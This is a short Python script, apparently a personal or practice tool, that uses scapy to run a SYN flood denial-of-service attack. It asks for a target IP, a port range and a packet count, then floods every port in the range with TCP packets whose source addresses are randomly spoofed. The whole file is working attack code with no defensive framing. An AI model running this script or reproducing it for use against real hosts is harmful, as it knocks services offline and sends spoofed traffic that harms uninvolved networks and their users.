
from scapy.all import *
from scapy.layers.inet import TCP,IP
import socket
import random
import struct



class SynFlooadAttacker():
    def __init__(self):
        self.target = "192.168.174.177"
        self.low    = 0
        self.high   = 81
        self.atkcount=2500
    def setTargetAndSource(self):
        self.target = input("Please input target ip :")
        self.low    = input("Please input lower bound of destination port :")
        self.high   = input("Please input higher bound of destination port:")
        self.atkcount=int(input("Please input attack count :"))
    def attack(self):
        self.setTargetAndSource()
        for i in range(4):
            for dport in range(int(self.low),int(self.high)):
                randIP = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
                send(IP(src=randIP,dst=self.target)/TCP(sport=22,dport=dport),count=self.atkcount/4)


atk = SynFlooadAttacker()
atk.attack()